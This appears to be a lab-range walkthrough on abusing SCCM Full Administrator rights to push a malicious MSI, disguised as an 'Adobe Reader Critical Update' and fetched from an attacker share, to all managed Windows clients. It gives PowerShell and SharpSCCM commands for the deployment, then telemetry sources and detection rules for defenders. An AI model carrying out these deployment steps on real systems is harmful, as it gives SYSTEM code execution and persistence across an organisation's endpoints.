# WT#038 — SCCM Application Deployment

## Metadata
| Field | Value |
|-------|-------|
| **Target VM** | mbr02 (192.168.77.23) |
| **Domain** | range.local |
| **Starting Credential** | SCCM Full Administrator privileges |
| **Tools Required** | SharpSCCM, Configuration Manager Console |
| **Certifications** | WKL (WasteHelloKitty — OADOC) |
| **MITRE ATT&CK** | T1218.003 (CMSTP), T1072 (Software Deployment Tools) |
| **Difficulty** | Medium |

## Prerequisites
- SCCM Full Administrator role — `RANGE\svc_sccm` has Full Admin rights
- SCCM site server (CAD) running on mbr02
- Ability to create and deploy applications via SCCM console or PowerShell

## Attack Steps

### 1. Create malicious application in SCCM

```powershell
# Using Configuration Manager PowerShell cmdlets
New-CMApplication -Name "Adobe Reader Critical Update" -Publisher "Adobe Inc." -SoftwareVersion "2026.05.001"

# Add deployment type with malicious payload
New-CMDeploymentType -ApplicationName "Adobe Reader Critical Update" -DeploymentTypeName "Windows Installer" -MsiInstaller -ContentLocation "\\attacker\share\payload.msi"
```

### 2. Distribute content to distribution points

```powershell
Start-CMContentDistribution -ApplicationName "Adobe Reader Critical Update" -DistributionPointName "sccm-range.range.local"
```

### 3. Deploy to target collection

```powershell
# Deploy application with required assignment
New-CMApplicationDeployment -ApplicationName "Adobe Reader Critical Update" -CollectionName "All Windows Clients" -DeploymentPurpose Required -AvailableDateTime (Get-Date) -DeadlineDateTime (Get-Date).AddHours(1)

# Or via SharpSCCM
SharpSCCM.exe deploy -s sccm-range.range.local -n "Adobe Reader Critical Update" -c "All Windows Clients" -p Required
```

### 4. Trigger deployment on client

```powershell
# On target client — force policy retrieval
Get-WmiObject -Namespace "root\CCM" -Class "SMS_Client" | Invoke-WmiMethod -Name TriggerSchedule "{00000000-0000-0000-0000-000000000021}"

# Or wait for default policy polling cycle (every 60 minutes)
```

### 5. Verify payload execution

```powershell
# Malicious MSI executes on target as SYSTEM
# Beacon or callback to attacker C2
```

## Post-Exploitation Chain
```
SCCM Full Admin Access
  └──> Malicious Application Deployment (WT#038)
       └──> Application pushed to ALL managed clients
            ├──> Code execution (SYSTEM) on every endpoint
            ├──> Persistent backdoor via Application CI
            │    └──> Re-deploys on policy refresh
            └──> Full organization compromise
```

## Telemetry Verification
**On SCCM site server:**
- **AppEnforce.log**: `C:\Program Files\Microsoft Configuration Manager\Logs\AppEnforce.log`
- **PolicyAgent.log**: Application deployment policy distribution
- **SMSAdminUI.log**: Application creation and deployment
- **Event ID 4663** (Application CI creation in SMS Provider)

**On managed endpoints:**
- **AppDiscovery.log**: Application detection and discovery
- **AppEnforce.log** (local): Application enforcement details
- **Event ID 4688** (MSIEXEC.EXE launched by CCMSETUP)
- **Event ID 11707** (MSI installation succeeded with product code)
- Network connections to distribution point for content download

**Detection Rules:**
- Unsigned MSI payloads distributed via SCCM application model
- Non-standard application deployments to "All Systems" or broad collections
- SharpSCCM.exe `deploy` command execution
- MSIEXEC.EVE launched from non-standard source paths (network shares)
- Application CI creation outside of normal change management windows

## Status
**CONFIGURED** — SCCM site server with distribution point running on mbr02. `RANGE\svc_sccm` can create and deploy malicious applications to all SCCM clients. Requires SCCM Console access.
